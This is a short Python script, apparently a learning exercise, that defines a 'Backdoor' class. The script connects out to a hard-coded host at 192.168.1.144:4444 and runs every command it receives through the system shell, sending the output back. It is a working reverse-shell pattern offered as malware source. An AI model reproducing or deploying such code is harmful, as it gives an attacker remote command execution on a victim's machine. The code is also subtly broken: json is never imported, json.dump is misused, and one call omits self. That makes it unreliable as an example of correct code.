import socket, subprocess
class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
		
	def reliable_send(self, data):
		json_data = json.dump(data) #wrap data in json format
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = self.connection.recv(1024)
		return json.loads(json_data) #unwrap json data

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

	def run(self):
		connection.send("\n[+] Welcome to hell\n")
		while True:
			command = self.connection.recv(1024) # will wait for data to be sent so that it can be received, will get a broken pipe if file/ data is larger than this
			command_result = self.execute_system_command(command)
			self.connection.send(command_result)
		self.connection.close()
	
my_backdoor = Backdoor("192.168.1.144", 4444)
my_backdoor.run()